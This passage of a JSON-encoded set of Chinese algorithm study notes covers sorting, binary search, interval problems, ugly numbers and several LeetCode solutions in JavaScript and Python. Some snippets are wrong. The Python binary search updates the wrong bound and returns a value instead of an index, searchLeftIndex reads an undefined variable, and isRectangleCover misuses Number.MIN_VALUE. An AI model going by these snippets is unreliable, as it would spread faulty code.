maxCake) {\n        maxCakeIndex = i;\n        maxCake = cakes[i];\n      }\n    }\n    // 第一次翻转，将最大饼翻到最上面\n    reverse(cakes, 0, maxCakeIndex);\n    res.push(maxCakeIndex + 1);\n    // 第二次翻转，将最大饼翻到最下面\n    reverse(cakes, 0, n - 1);\n    res.push(n);\n    // 递归调用\n    sort(cakes, n - 1);\n  };\n\n  const reverse = function (arr, i, j) {\n    while (i < j) {\n      var temp = arr[i];\n      arr[i] = arr[j];\n      arr[j] = temp;\n      i++;\n      j--;\n    }\n  };\n\n  sort(cakes, cakes.length);\n  return res;\n};\n\n```","R7y1YqWN":"\n# 归并排序\n\n\n\n## 目录\n<!-- toc -->\n ## 归并排序 \n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/f102429e7ca84c46952a0989aea93b85.png)![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/71da9e0da956a80bceba467b825b7e4b.png)\n\n```javascript\nconst mergeSort = arr => {\n    // 采用自上而下的递归方法\n    const len = arr.length;\n    // 递归条件\n    if (len < 2) {\n        return arr;\n    }\n    let middle = Math.floor(len / 2),\n        left = arr.slice(0, middle),\n        right = arr.slice(middle); // 拆分为两个子数组\n\n    return merge(mergeSort(left), mergeSort(right));\n};\n\n// 合并两个已经排好序的数组，无论left或者right里有多少元素\nconst merge = (left, right) => {\n    const result = [];\n    while (left.length && right.length) {\n        // 注意: 判断的条件是小于或等于，如果只是小于，那么排序将不稳定.\n        if (left[0] <= right[0]) {\n            result.push(left.shift());\n        } else {\n            result.push(right.shift());\n        }\n    }\n    while (left.length) result.push(left.shift());\n    while (right.length) result.push(right.shift());\n    return result;\n};\n```\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/895608ee1ddbdd7d2eec7e444ba4a3d4.png)\n\n## 计算右侧小于当前元素的个数\n\n![image.png|512](https://832-1310531898.cos.ap-beijing.myqcloud.com/e53b4dd68d10a86f58d00de2c05d81cc.png)\n\n","FealC1L5":"\n# 搜索算法\n\n\n","XqjXcICZ":"\n# 二分查找\n\n\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 注意下面的顺序 ① ② ③\n\t- left →  right  → left\n\t- right →  left  → right\n- 都使用 `elseif`\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240926210526.png)\n\n\n## 2. 查找目标值\n\n```javascript\n// 二分查找\nfunction binarySearch(arr, target) {\n  // 左右指针\n  let left = 0;\n  let right = arr.length - 1;\n\n  // 当左指针小于等于右指针时，继续查找\n  while (left <= right) {\n    let mid = Math.floor((left + right) / 2);\n\n    if (arr[mid] < target) {\n      // 如果目标值小于中间值，则说明目标值在右侧，更新左指针\n      // 在右半边查找\n      left = mid + 1;\n    } else if (arr[mid] > target) {\n      // 如果目标值大于中间值，则说明目标值在左侧，更新右指针\n      // 在左半边查找\n      right = mid - 1;\n    } else if (arr[mid] === target) {\n      // 如果找到目标，直接返回即可\n      return mid;\n    }\n  }\n  // 未找到\n  return -1;\n}\n```\n\n\n```python\n# 二分查找\ndef binary_search(list, target):\n    left = 0\n    right = len(list) - 1\n    while left <= right:\n        ## // 是整数除法运算符（向下取整除法）\n        mid_index = (left + right) // 2\n        mid = list[mid_index]\n        # 如果目标值大于中间值，则更新右边界\n        # 在左半边查找\n        if target > mid:\n            right = mid - 1\n        # 如果目标值小于中间值，则更新左边界\n        # 在右半边查找\n        elif target < mid:\n            left = mid + 1\n        elif target == mid:\n            return mid\n    return None\n\n```\n\n## 3. 查找最左边的目标值\n\n```javascript\nfunction searchLeftIndex(arr, target) {\n  var left = 0,\n    right = nums.length - 1;\n  while (left <= right) {\n    var mid = left + Math.floor((right - left) / 2);\n    if (nums[mid] < target) {\n      left = mid + 1;\n    } else if (nums[mid] > target) {\n      right = mid - 1;\n    } else if (nums[mid] == target) {\n      // 别返回，锁定左侧边界\n      right = mid - 1;\n    }\n  }\n  // 判断 target 是否存在于 nums 中\n  if (left < 0 || left >= nums.length) {\n    return -1;\n  }\n  // 判断一下 nums[left] 是不是 target\n  return nums[left] == target ? left : -1;\n}\n```\n\n\n## 4. 查找最右边的目标值\n\n```javascript\nvar searchRightIndex = function (nums, target) {\n  var left = 0,\n    right = nums.length - 1;\n  while (left <= right) {\n    var mid = left + Math.floor((right - left) / 2);\n    if (nums[mid] < target) {\n      left = mid + 1;\n    } else if (nums[mid] > target) {\n      right = mid - 1;\n    } else if (nums[mid] == target) {\n      // 别返回，锁定右侧边界\n      left = mid + 1;\n    }\n  }\n  // 由于 while 的结束条件是 right == left - 1，且现在在求右边界\n  // 所以用 right 替代 left - 1 更好记\n  if (right < 0 || right >= nums.length) {\n    return -1;\n  }\n  return nums[right] == target ? right : -1;\n};\n\n```\n\n","dmjjSw0s":"\n# 搜索算法总结\n\n\n\n## 目录\n<!-- toc -->\n ## 暴力搜索 \n\n- 遍历数组\n- 遍历链表\n- 遍历二叉树\n\t- BFS、DFS\n- 遍历多叉树\n\t- BFS、DFS\n- 遍历图\n\t- BFS、DFS\n\n## 利用数据的特有属性（例如有序性）来优化搜索过程\n\n\n- **二分查找** 利用数据的**有序性**实现高效查找，仅适用于数组。\n- **哈希查**找利用哈希表将搜索数据和目标数据建立为**键值对**映射，从而实现查询操作。\n\t- 以空间换时间\n- **树查找**在特定的树结构（例如**二叉搜索树**）中，基于比较节点值来快速排除节点，从而定位目标元素\n\n","f1QPjkZB":"\n# 其他常见算法篇\n\n\n\n- 其他算法\n","SHEAIuID":"\n# 区间问题\n\n\n`#leetcode`   `#2024/08/18`  `#算法/区间问题`  `#算法/双指针`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 区间问题解题思路 \n\n所谓**区间问题**，就是**线段问题**，让你合并所有线段、找出线段的交集等等。主要有**两个技巧**：\n1. **排序**\n    - 先按照起点**升序**排序，\n    - 若起点相同，则按照终点**降序**排序。\n2. **画图**。就是说不要偷懒，勤动手，两个区间的相对位置到底有几种可能，不同的相对位置我们的代码应该怎么去处理\n\n## 2. LeetCode 1288：删除被覆盖区间\n\n### 2.1. 题目\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240818213325.png)\n\n### 2.2. 思路\n\n先**排序**，如下图\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240818213541.png)\n\n排完序后，只有下面**三种情况**\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240818213758.png)\n\n算法的**关键点**：\n1. 排序策略：按起始位置升序，相同起始位置时按结束位置降序。这确保了在处理重叠时的正确性。\n2. 三种情况的处理，下面三种情况涵盖了所有可能的区间关系\n\t1. 完全覆盖\n\t2. 可合并\n\t3. 完全不相交\n3. 遍历时使用了**双指针**，根据上面三种情况**更新双指针**\n4. 记住，返回的**剩余的区间数**\n\n### 2.3. 代码实现\n\n```javascript\n/**\n * @description 区间列表的删除：区间问题\n * @param {number[][]} intervals\n * @return {number}\n */\nvar removeCoveredIntervals = function (intervals) {\n  let res = 0;\n  // ① 按照区间的起始位置排序，升序排序,如果起始位置相同，则按照结束位置降序排序\n  intervals.sort((a, b) => a[0] - b[0] || b[1] - a[1]);\n\n  // ②  初始化左指针，右指针,\n  //      左指针指向第一个区间的起始位置\n  //      右指针指向第一个区间的结束位置\n  let left = intervals[0][0];\n  let right = intervals[0][1];\n\n  // ③  遍历区间数组\n  for (let i = 1; i < intervals.length; i++) {\n    let currInterval = intervals[i];\n    // 情况一：有重叠\n    if (left <= currInterval[0] && right >= currInterval[1]) {\n      res++;\n    }\n    // 情况二：可以合并\n    if (right < currInterval[1]) {\n      left = currInterval[0];\n      right = currInterval[1];\n    }\n    // 情况三：完全不相交\n    if (right < currInterval[0]) {\n      left = currInterval[0];\n      right = currInterval[1];\n    }\n  }\n\n  // 返回结果：区间列表的删除，即总区间数减去可以删除的区间数\n  // ::::题设中需要返回【剩余区间的数目】\n  return intervals.length - res;\n};\n\n```\n\n### 2.4. 复杂度分析\n\n时间复杂度分析：\n1. 排序：使用了 JavaScript 的内置排序方法，时间复杂度为 `O(n log n)`，其中 n 是区间的数量。\n2. 遍历区间：一次线性遍历，时间复杂度为 `O(n)`。\n3. 总的时间复杂度：O(n log n) + O(n) = `O(n log n)`，主要由排序步骤决定。\n\n空间复杂度分析：\n1. 排序：JavaScript 的排序算法通常使用额外的 O(log n) 到 O(n) 的空间。\n2. 其他变量（left, right, res）：使用常数额外空间。\n3. 总的空间复杂度：`O(log n) 到 O(n)`，==主要取决于排序算法的实现==。\n\n### 2.5. 错误记录\n\n> [!danger]\n> 关于**区间排序**，一直觉得是 sort 里面嵌套 sort，其实不是，**一个 sort 回调即可**\n\n****\n```javascript\narr.sort((a, b) => {  \n    if (a[0] == b[0]) {  \n        return b[1] - a[1];  \n    }  \n    return a[0] - b[0];  \n});\n\n// 简写\narr.sort((a, b) => a[0] - b[0] || b[1] - a[1]);\n```\n\n## 3. 示例二：区间合并问题\n\n> 详见 [12. 算法/3. 刷题篇/2. LeetCode 热题 100 题/12.  合并区间|12.  合并区间](/post/SHEAIuID.html#12-算法/3-刷题篇/2-LeetCode-热题-100-题/12--合并区间|12--合并区间)\n\n## 4. 示例三：区间列表的交集\n\n### 4.1. 题目\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240818220146.png)\n\n> https://leetcode.cn/problems/interval-list-intersections/description/\n\n### 4.2. 思路\n\n- 我们用 `[a1, a2]` 和 `[b1, b2]` 表示在 `A` 和 `B` 中的两个区间，\n\t- 如果这两个区间有交集，需满足 `b2 >= a1 && a2 >= b1`，分下面四种情况：\n\t\t- ![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240818220516.png)\n\t\t- 根据上图可以发现规律，假设交集区间是 `[c1, c2]`\n\t\t\t- 那么 `c1 = max(a1, b1), c2 = min(a2, b2)`，如下图\n\t\t\t- ![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240818220652.png)\n\n结合动图看看：\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Interval Problem Solution.gif|504)\n\n### 4.3. 代码实现\n\n```javascript\n/**\n * @description 区间列表的交集\n * @param {number[][]} firstList\n * @param {number[][]} secondList\n * @return {number[][]}\n */\nvar intervalIntersection = function (firstList, secondList) {\n  let res = [];\n  // 双指针\n  let i = 0,\n    j = 0;\n  while (i < firstList.length && j < secondList.length) {\n    let a1 = firstList[i][0],\n      a2 = firstList[i][1];\n    let b1 = secondList[j][0],\n      b2 = secondList[j][1];\n    // ① 交集存在的情况：\n    //   即 b 区间的起始位置小于等于 a 区间的结束位置\n    // 并且 a 区间的起始位置小于等于 b 区间的结束位置\n    if (b2 >= a1 && a2 >= b1) {\n      res.push([Math.max(a1, b1), Math.min(a2, b2)]);\n    }\n\n    // ② 更新指针\n    //   如果 a 区间的结束位置小于 b 区间的结束位置，则 a 区间的指针向后移动\n    if (a2 < b2) {\n      i++;\n      //  如果 b 区间的结束位置小于 a 区间的结束位置，则 b 区间的指针向后移动\n    } else {\n      j++;\n    }\n  }\n  return res;\n};\n\n```\n\n### 4.4. 复杂度分析\n\n时间复杂度：\n- 假设两个数组的长度都是 n。\n- 算法遍历两个数组一次，每次循环最多执行一次。\n- 因此，时间复杂度是 `O(n)`。\n\n空间复杂度：\n- 结果数组 res：在最坏情况下（所有区间都有交集），**可能需要存储 n 个交集区间**。\n- 其他变量使用常数额外空间。\n- 总的空间复杂度：`O(n)`，主要由结果数组决定。\n\n算法的优点（考虑到数组长度相同）：\n1. 高效：时间复杂度 O(n) 是线性的，这是解决此问题的最优复杂度。\n2. 一次遍历：通过一次遍历就能找出所有交集。\n3. 无需排序：假设输入列表已经按区间起始时间排序。\n\n关键点：\n1. **双指针技巧**：使用两个指针同步遍历两个列表。\n2. 交集判断和指针移动策略保持不变。\n\n总结： 考虑到两个输入数组长度相同，这个算法的性能特征更加明确。它以 O(n) 的时间复杂度和 O(n) 的空间复杂度高效地解决了问题，其中 n 是每个输入数组的长度。这个方法对于查找两个等长排序区间列表的交集是最优解。\n\n### 4.5. 注意点\n\n- 利用**双指针** 技巧\n- 另外 `a1 、a2 、b1、b2 、c1 、 c2` 这几个变量的关系一定要搞清楚，不然会出问题\n\n","IAHsrleQ":"\n# 完美矩阵\n\n\n\n## 目录\n<!-- toc -->\n ## 题目 \n\n|LeetCode|力扣|难度|\n|---|---|---|\n|[391. Perfect Rectangle](https://leetcode.com/problems/perfect-rectangle/)|[391. 完美矩形](https://leetcode.cn/problems/perfect-rectangle/)|🔴|\n\n![图片&文件](./files/20241119-7.png)\n\n![图片&文件](./files/20241119-8.png)\n\n## 思路\n\n1. 判断面积，通过完美矩形的理论坐标计算出一个**理论面积**，然后和 `rectangles` 中小矩形的实际面积和做对比\n2. 判断顶点，`points` 集合中应该只剩下 4 个顶点且剩下的顶点必须都是完美矩形的**理论顶点**\n\n## 代码\n\n```javascript\nvar isRectangleCover = function(rectangles) {\n    var X1 = Number.MAX_VALUE, Y1 = Number.MAX_VALUE;\n    var X2 = Number.MIN_VALUE, Y2 = Number.MIN_VALUE;\n    var actualArea = 0;\n    // 哈希集合，记录最终图形的顶点\n    var points = new Set();\n    for (var rect of rectangles) {\n        var x1 = rect[0], y1 = rect[1], x2 = rect[2], y2 = rect[3];\n        X1 = Math.min(X1, x1);\n        Y1 = Math.min(Y1, y1);\n        X2 = Math.max(X2, x2);\n        Y2 = Math.max(Y2, y2);\n        actualArea += (x2 - x1) * (y2 - y1);\n        // 先算出小矩形每个点的坐标，用字符串表示，方便存入哈希集合\n        var p1 = x1 + \",\" + y1;\n        var p2 = x1 + \",\" + y2;\n        var p3 = x2 + \",\" + y1;\n        var p4 = x2 + \",\" + y2;\n        // 对于每个点，如果存在集合中，删除它；\n        // 如果不存在集合中，添加它；\n        // 这个简单的逻辑，让 `points` 集合最终只会留下那些出现了 1 次或者 3 次的顶点，\n        // 那些出现了 2 次或者 4 次的顶点都被消掉了\n        // 在集合中剩下的点都是出现奇数次的点\n        for (var p of [p1, p2, p3, p4]) {\n            if (points.has(p)) {\n                points.delete(p);\n            } else {\n                points.add(p);\n            }\n        }\n    }\n    var expectedArea = (X2 - X1) * (Y2 - Y1);\n    if (actualArea != expectedArea) {\n        return false;\n    }\n    // 检查顶点个数\n    if (points.size != 4 || \n        !points.has(X1 + \",\" + Y1) || \n        !points.has(X1 + \",\" + Y2) || \n        !points.has(X2 + \",\" + Y1) || \n        !points.has(X2 + \",\" + Y2)) {\n        return false;\n    }\n    return true;\n};\n```","dgQYGpKx":"\n# 分割数组为连续子序列：斗地主的顺子\n\n\n\n## 目录\n<!-- toc -->\n ## 题目 \n\n| LeetCode                                                                                                                   | 力扣                                                                                         | 难度  |\n| -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ | --- |\n| [659. Split Array into Consecutive Subsequences](https://leetcode.com/problems/split-array-into-consecutive-subsequences/) | [659. 分割数组为连续子序列](https://leetcode.cn/problems/split-array-into-consecutive-subsequences/) | 🟠  |\n\n![图片&文件](./files/20241119-9.png)\n\n> 但斗地主里面顺子至少要 5 张连续的牌，和这个题唯一的差别了就是这个了\n\n要点：\n- 给定一个按**升序排序**的整数数组 nums，判断能否将它分割成**一个或多个**  `长度至少为 3` 的连续子序列。\n比如题目举的例子\n- 输入 `nums = [1,2,3,3,4,4,5,5]`，算法返回 true。因为 `nums` 可以被分割成 `[1,2,3,4,5]` 和 `[3,4,5]` 两个包含连续整数子序列。\n- 但如果输入 `nums = [1,2,3,4,4,5]`，算法返回 false，因为无法分割成**两个长度至少为 3** 的连续子序列。\n\n## 思路\n\n1. 使用贪心算法\n    - 优先将数字加入到已有的序列中\n    - 如果不能加入已有序列，才尝试新建序列\n3. 需要两个哈希表：\n    - countMap：统计`每个数字的剩余次数`\n    - endMap：统计`以某个数字结尾`的连续子序列的个数\n\n## 代码\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {boolean}\n */\nvar isPossible = function (nums) {\n  // 统计每个数字的出现次数\n  const countMap = new Map();\n  // 统计以某个数字结尾的连续子序列的个数\n  const endMap = new Map();\n\n  // 初始化 countMap\n  for (const num of nums) {\n    countMap.set(num, (countMap.get(num) || 0) + 1);\n  }\n\n  // 遍历数组\n  for (const num of nums) {\n    const count = countMap.get(num);\n    if (count === 0) {\n      // 当前数字已经被使用完\n      continue;\n    }\n\n    // 先判断是否可以加入到已有的子序列后面\n    if (endMap.get(num - 1) > 0) {\n      // 可以接在前一个数字结尾的子序列后面\n      countMap.set(num, count - 1);\n      endMap.set(num - 1, endMap.get(num - 1) - 1);\n      endMap.set(num, (endMap.get(num) || 0) + 1);\n    } else {\n      // 需要新建一个子序列，检查后续两个数字是否可用\n      const count1 = countMap.get(num + 1) || 0;\n      const count2 = countMap.get(num + 2) || 0;\n\n      if (count1 > 0 && count2 > 0) {\n        // 可以形成新的长度为3的子序列\n        countMap.set(num, count - 1);\n        countMap.set(num + 1, count1 - 1);\n        countMap.set(num + 2, count2 - 1);\n        endMap.set(num + 2, (endMap.get(num + 2) || 0) + 1);\n      } else {\n        // 无法形成长度为3的子序列\n        return false;\n      }\n    }\n  }\n\n  return true;\n};\n\n```","2LLECEpC":"\n# 字符串乘法计算\n\n\n|LeetCode|力扣|难度|\n|---|---|---|\n|[43. Multiply Strings](https://leetcode.com/problems/multiply-strings/)|[43. 字符串相乘](https://leetcode.cn/problems/multiply-strings/)|🟠|\n\n## 目录\n<!-- toc -->\n ## 题目 \n\n![图片&文件](./files/20241119-4.png)\n\n\n## 思路：模拟手算\n\n![图片&文件](./files/20241119-5.png)\n\n```css\n    1 2 3\n  ×   4 5\n---------\n      1 5     (3 × 5)\n    1 0       (2 × 5)\n  5           (1 × 5)\n    1 2       (3 × 4)\n  8           (2 × 4)\n4             (1 × 4)\n---------\n5 5 3 5\n```\n\n- 先计算 `3×5=15`，`1` 放在`result[3]`，`5` 放在`result[4]`\n- 再计算 `2x5 = 10` \n- ....\n\n\n`num1[i]` 和 `num2[j]` 的乘积对应的就是 `res[i+j]` 和 `res[i+j+1]`，如下图\n\n- `3 * 4` 等 `12` \n\t- `res[2] = 1` \n\t-  `res[3] = 2`\n\n\n![图片&文件](./files/20241119-6.png)\n\n## 代码\n\n```javascript\nvar multiply = function(num1, num2) {\n    let m = num1.length, n = num2.length;\n    // 结果最多为 m + n 位数\n    let res = new Array(m + n).fill(0);\n    // 从个位数开始逐位相乘\n    for (let i = m - 1; i >= 0; i--) {\n        for (let j = n - 1; j >= 0; j--) {\n            let mul = (num1[i] - '0') * (num2[j] - '0');\n            // 乘积在 res 对应的索引位置\n            let p1 = i + j, p2 = i + j + 1;\n            // 叠加到 res 上\n            let sum = mul + res[p2];\n            res[p2] = sum % 10;\n            res[p1] += Math.floor(sum / 10);\n        }\n    }\n    // 结果前缀可能存的 0（未使用的位）\n    let i = 0;\n    while (i < res.length && res[i] == 0)\n        i++;\n    // 将计算结果转化成字符串\n    let str = \"\";\n    for (; i < res.length; i++)\n        str += res[i];\n    \n    return str.length == 0 ? \"0\" : str;\n}\n```","i6FEyoET":"\n# 为运算表达式设计优先级\n\n\n\n## 目录\n<!-- toc -->\n ## 题目 \n\n| LeetCode                                                                                                   | 力扣                                                                                  | 难度  |\n| ---------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------- | --- |\n| [241. Different Ways to Add Parentheses](https://leetcode.com/problems/different-ways-to-add-parentheses/) | [241. 为运算表达式设计优先级](https://leetcode.cn/problems/different-ways-to-add-parentheses/) | 🟠  |\n\n![图片&文件](./files/20241119-10.png)\n\n\n## 思路\n\n就是使用递归，遍历除所有可能即可\n\n## 代码\n\n\n```javascript\nvar diffWaysToCompute = function(input) {\n    let res = [];\n    for (let i = 0; i < input.length; i++) {\n        let c = input.charAt(i);\n        // 扫描算式 input 中的运算符\n        if (c == '-' || c == '*' || c == '+') {\n            // ****** 分 ******\n            // 以运算符为中心，分割成两个字符串，分别递归计算\n            let left = diffWaysToCompute(input.substring(0, i));\n            let right = diffWaysToCompute(input.substring(i + 1));\n            // ****** 治 ******\n            // 通过子问题的结果，合成原问题的结果\n            for (let a of left)\n                for (let b of right)\n                    if (c == '+')\n                        res.push(a + b);\n                    else if (c == '-')\n                        res.push(a - b);\n                    else if (c == '*')\n                        res.push(a * b);\n        }\n    }\n    // base case\n    // 如果 res 为空，说明算式是一个数字，没有运算符\n    if (res.length == 0) {\n        res.push(parseInt(input));\n    }\n    return res;\n};\n```\n\n","5PhjFk3D":"\n# 丑数问题\n\n\n| LeetCode                                                                   | 力扣                                                            | 难度  |\n| -------------------------------------------------------------------------- | ------------------------------------------------------------- | --- |\n| [313. Super Ugly Number](https://leetcode.com/problems/super-ugly-number/) | [313. 超级丑数](https://leetcode.cn/problems/super-ugly-number/)  | 🟠  |\n| [264. Ugly Number II](https://leetcode.com/problems/ugly-number-ii/)       | [264. 丑数 II](https://leetcode.cn/problems/ugly-number-ii/)    | 🟠  |\n| [1201. Ugly Number III](https://leetcode.com/problems/ugly-number-iii/)    | [1201. 丑数 III](https://leetcode.cn/problems/ugly-number-iii/) | 🟠  |\n| [263. Ugly Number](https://leetcode.com/problems/ugly-number/)             | [263. 丑数](https://leetcode.cn/problems/ugly-number/)          | 🟢  |\n\n\n## 目录\n<!-- toc -->\n ## 1. 第 263 题「[丑数](https://leetcode.cn/problems/ugly-number)」 \n\n所谓「丑数」，就是只包含质因数 `2`、`3` 和 `5` 的正整数\n\n```javascript\nvar isUgly = function (n) {\n  if (n <= 0) return false;\n  // 如果 n 是丑数，分解因子应该只有 2, 3, 5\n  while (n % 2 == 0) n /= 2;\n  while (n % 3 == 0) n /= 3;\n  while (n % 5 == 0) n /= 5;\n  // 如果能够成功分解，说明是丑数\n  return n == 1;\n};\n```\n\n## 2. 第 264 题「[丑数 II](https://leetcode.cn/problems/ugly-number-ii)」\n\n题目：给你输入一个 `n`，让你计算第 `n` 个丑数是多少\n\n思路：\n- 抽象出三条有序的丑数链表，合并这三条有序链表得到的结果就是丑数序列，其中第 `n` 个丑数就是题目想要的答案\n- 我们用 `p2, p3, p5` 分别代表三条丑数链表上的指针，用 `product2, product3, product5` 代表丑数链表上节点的值，用 `ugly` 数组记录有序链表合并之后的结果。\n\n```javascript\nvar nthUglyNumber = function (n) {\n  // 可以理解为三个指向有序链表头结点的指针\n  let p2 = 1,\n    p3 = 1,\n    p5 = 1;\n  // 可以理解为三个有序链表的头节点的值\n  let product2 = 1,\n    product3 = 1,\n    product5 = 1;\n  // 可以理解为最终合并的有序链表（结果链表）\n  let ugly = new Array(n + 1);\n  // 可以理解为结果链表上的指针\n  let p = 1;\n\n  // 开始合并三个有序链表，找到第 n 个丑数时结束\n  while (p <= n) {\n    // 取三个链表的最小结点\n    let min = Math.min(Math.min(product2, product3), product5);\n    // 将最小节点接到结果链表上\n    ugly[p] = min;\n    p++;\n    // 前进对应有序链表上的指针\n    if (min == product2) {\n      product2 = 2 * ugly[p2];\n      p2++;\n    }\n    if (min == product3) {\n      product3 = 3 * ugly[p3];\n      p3++;\n    }\n    if (min == product5) {\n      product5 = 5 * ugly[p5];\n      p5++;\n    }\n  }\n\n  // 返回第 n 个丑数\n  return ugly[n];\n};\n```\n\n## 3. 第 313 题「[超级丑数](https://leetcode.cn/problems/super-ugly-number)」\n\n输入一个质数列表 `primes` 和一个正整数 `n`，请你计算第 `n` 个「超级丑数」\n\n所谓超级丑数是一个**所有质因数**都出现在 `primes` 中的正整数\n\n### 3.1. 示例\n\n![图片&文件](./files/20241120.png)\n\n如果让 `primes = [2, 3, 5]` 就是上道题：第 263 题「[丑数](https://leetcode.cn/problems/ugly-number)」，但我们不能用 `min` 函数计算最小头结点了，而是要用**优先级队列**来计算**最小头结点**，同时依然要**维护链表指针**、**指针所指节点的值**，我们可以用一个**三元组** 来保存这些信息\n\n看代码\n\n```javascript\nvar nthSuperUglyNumber = function (n, primes) {\n  // 优先队列中装三元组：{ product, prime, pi}\n  // 其中 product 代表链表节点的值，prime 是计算下一个节点所需的质数因子， pi 代表链表上的指针\n  let pq = new MinPriorityQueue({ priority: (pair) => pair[0] });\n\n  for (let prime of primes) {\n    pq.enqueue([1, prime, 1]);\n  }\n\n  // 可以理解为最终合并的有序链表（结果链表）\n  let ugly = new Array(n + 1);\n  // 可以理解为结果链表上的指针\n  let p = 1;\n\n  while (p <= n) {\n    // 取三个链表的最小结点\n    let pair = pq.dequeue().element;\n    let product = pair[0];\n    let prime = pair[1];\n    let index = pair[2];\n\n    // 避免结果链表出现重复元素\n    if (product != ugly[p - 1]) {\n      // 接到结果链表上\n      ugly[p] = product;\n      p++;\n    }\n\n    // 生成下一个节点加入优先级队列\n    pq.enqueue([ugly[index] * prime, prime, index + 1]);\n  }\n  return ugly[n];\n};\n```\n\n## 4. 第 1201 题「[丑数 III](https://leetcode.cn/problems/ugly-number-iii)」\n\n### 4.1. 题目\n\n给你四个整数：`n, a, b, c`，请你设计一个算法来找出第 `n` 个丑数。其中丑数是可以被 `a` **或** `b` **或** `c` 整除的正整数。\n\n这道题和之前题目的不同之处在于它**改变了丑数的定义**，只要一个正整数 `x` 存在 `a, b, c` 中的任何一个因子，那么 `x` 就是丑数。\n\n比如输入 `n = 7, a = 3, b = 4, c = 5`，那么算法输出 `10`，因为符合条件的丑数序列为 `3, 4, 5, 6, 8, 9, 10, ...`，其中第 7 个数字是 10。\n\n有了之前几道题的铺垫，你肯定可以想到把 `a, b, c` 的倍数抽象成三条有序链表：\n\n```js\n1*3 -> 2*3 -> 3*3 -> 4*3 -> 5*3 -> 6*3 -> 7*3 ->...\n1*4 -> 2*4 -> 3*4 -> 4*4 -> 5*4 -> 6*4 -> 7*4 ->...\n1*5 -> 2*5 -> 3*5 -> 4*5 -> 5*5 -> 6*5 -> 7*5 ->...\n```\n\n然后将这三条链表合并成一条有序链表并去除重复元素，这样合并后的链表元素就是丑数序列，我们从中找到第 `n` 个元素即可：\n\n```js\n1*3 -> 1*4 -> 1*5 -> 2*3 -> 2*4 -> 3*3 -> 2*5 ->...\n```\n\n\n写出代码\n\n### 4.2. 代码：超时\n\n\n```javascript\nvar nthUglyNumber = function (n, a, b, c) {\n  // 可以理解为三个有序链表的头结点的值\n  let productA = a,\n    productB = b,\n    productC = c;\n  // 可以理解为合并之后的有序链表上的指针\n  let p = 1;\n\n  let minProduct = -666;\n\n  // 开始合并三个有序链表，获取第 n 个节点的值\n  while (p <= n) {\n    // 取三个链表的最小结点\n    minProduct = Math.min(productA, productB, productC);\n    p++;\n    // 前进最小结点对应链表的指针\n    if (minProduct == productA) {\n      productA += a;\n    }\n    if (minProduct == productB) {\n      productB += b;\n    }\n    if (minProduct == productC) {\n      productC += c;\n    }\n  }\n  return minProduct;\n};\n\n```\n\n注意题目给的数据范围非常大，`a, b, c, n` 的大小可以达到 `10^9`，所以即便上述算法的时间复杂度是 `O(n)`，也是相对比较耗时的，应该有更好的思路能够进一步降低时间复杂度。\n\n### 4.3. 解决思路\n\n定义一个**单调递增**的函数 `f`：\n- `f(num, a, b, c)` 计算 `[1..num]` 中，能够整除 `a` 或 `b` 或 `c` 的数字的个数\n\t- 显然函数 `f` 的返回值是随着 `num` 的增加而增加的（单调递增）\n- 题目让我们求第 `n` 个能够整除 `a` 或 `b` 或 `c` 的数字是什么，也就是说我们要找到一个最小的 `num`，使得 `f(num, a, b, c) == n`。\n\n```javascript\nvar nthUglyNumber = function (n, a, b, c) {\n  // 题目说本题结果在 [1, 2 * 10^9] 范围内，\n  // 所以就按照这个范围初始化两端都闭的搜索区间\n  let left = 1,\n    right = 2 * 10 ** 9;\n  // 搜索左侧边界的二分搜索\n  while (left <= right) {\n    let mid = left + Math.floor((right - left) / 2);\n    if (f(mid, a, b, c) < n) {\n      // [1..mid] 中符合条件的元素个数不足 n，所以目标在右半边\n      left = mid + 1;\n    } else {\n      // [1..mid] 中符合条件的元素个数大于 n，所以目标在左半边\n      right = mid - 1;\n    }\n  }\n  return left;\n};\n\n// 计算最大公因数（辗转相除/欧几里得算法）\nvar gcd = function (a, b) {\n  if (a < b) {\n    // 保证 a > b\n    return gcd(b, a);\n  }\n  if (b === 0) {\n    return a;\n  }\n  return gcd(b, a % b);\n};\n\n// 最小公倍数\nvar lcm = function (a, b) {\n  // 最小公倍数就是乘积除以最大公因数\n  return (a * b) / gcd(a, b);\n};\n\n// 计算 [1..num] 之间有多少个能够被 a 或 b 或 c 整除的数字\nvar f = function (num, a, b, c) {\n  let setA = Math.floor(num / a),\n    setB = Math.floor(num / b),\n    setC = Math.floor(num / c);\n  let setAB = Math.floor(num / lcm(a, b));\n  let setAC = Math.floor(num / lcm(a, c));\n  let setBC = Math.floor(num / lcm(b, c));\n  let setABC = Math.floor(num / lcm(lcm(a, b), c));\n  // 集合论定理：A + B + C - A ∩ B - A ∩ C - B ∩ C + A ∩ B ∩ C\n  return setA + setB + setC - setAB - setAC - setBC + setABC;\n};\n\n```\n\n\n","KqRM7ZD7":"\n# 常见的随机算法\n\n\n\n|LeetCode|力扣|难度|\n|---|---|---|\n|[398. Random Pick Index](https://leetcode.com/problems/random-pick-index/)|[398. 随机数索引](https://leetcode.cn/problems/random-pick-index/)|🟠|\n|[384. Shuffle an Array](https://leetcode.com/problems/shuffle-an-array/)|[384. 